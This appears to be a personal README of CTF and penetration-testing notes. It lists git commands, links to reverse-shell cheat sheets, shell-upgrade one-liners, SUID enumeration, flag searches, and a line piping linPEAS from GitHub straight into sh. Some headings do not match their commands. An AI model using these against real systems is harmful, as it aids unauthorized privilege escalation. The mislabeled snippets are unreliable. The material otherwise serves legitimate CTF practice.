# Random
Just a zunk of notes

###  Github command

```bash
git init                                                      
git remote add origin "Paste the link of the github"          
git remote -v                                                 
git add .                                                     
git commit -m "Name of the tool/subjet"                       
git push origin master.
```
### CTF Helper
```bash
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
```bash
https://gtfobins.github.io/
```
```bash
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
```
### Python TTY Shell
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```
### Bash Shell
```bash
echo os.system('/bin/bash')
```
### shell-PostExploitation
```bash
find / -perm -u=s -type f 2>/dev/null
```
### To clear terminal after spwanning shell
```bash
export TERM=xterm
```
### Auto-complete fuction after gettting shell

### Abusing SUID 
```bash
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
```
### Find command to find flags
```bash
stty raw - echo ; fg 
```
### Find Flags
```bash
→ find | grep flag 
→ find / -type f -name user.txt
→ find / -type -f name **name of the flag you want**
→ search -f flag*.txt #This will find the name called flag with file extension txt
```
### Quick Linux Privilege Escalataion
```bash
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
→ chmod +x linpeas.sh 
→ ./linpeas.sh
```
